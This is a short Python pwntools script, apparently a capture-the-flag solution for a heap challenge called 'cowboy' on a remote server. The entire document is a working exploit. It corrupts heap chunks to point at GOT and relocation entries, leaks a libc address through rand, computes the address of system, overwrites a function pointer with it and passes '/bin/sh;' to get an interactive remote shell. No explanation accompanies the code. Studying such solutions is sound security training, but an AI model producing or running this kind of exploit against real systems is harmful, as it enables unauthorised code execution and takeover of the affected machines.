from pwn import *

def alloc(size):
	r.sendlineafter("exit\n----------------------------------------\n", "1")
	r.sendlineafter("2049: ", str(size))

def show_heap_chunks():
	r.sendlineafter("exit\n----------------------------------------\n", "3")

def fill_data(binnum, chunknum, inp):
	r.sendlineafter("exit\n----------------------------------------\n", "4")
	r.sendlineafter("num? : ", str(binnum))
	r.sendlineafter("num? : ", str(chunknum))
	r.sendafter("input: ", inp)

r = remote("cowboy.eatpwnnosleep.com", 14697)

alloc(200)
fill_data(4, 0, 'A' * 8 + p64(0x0000000000602090) + 'A' * 24 + p64(0x00000000004005b8))	# rand got, free relocation table
alloc(300)
show_heap_chunks()
r.recvuntil("bin[5]: ")
libc = int(r.recvuntil("\n", drop=True).split(' ')[1], 16) - 0x000000000003AF60	# rand offset
system = libc + 0x0000000000045390	# system offset
print hex(libc)
alloc(20)
fill_data(1, 1, p64(system))
alloc(10)
fill_data(0, 0, '/bin/sh;')

r.interactive()
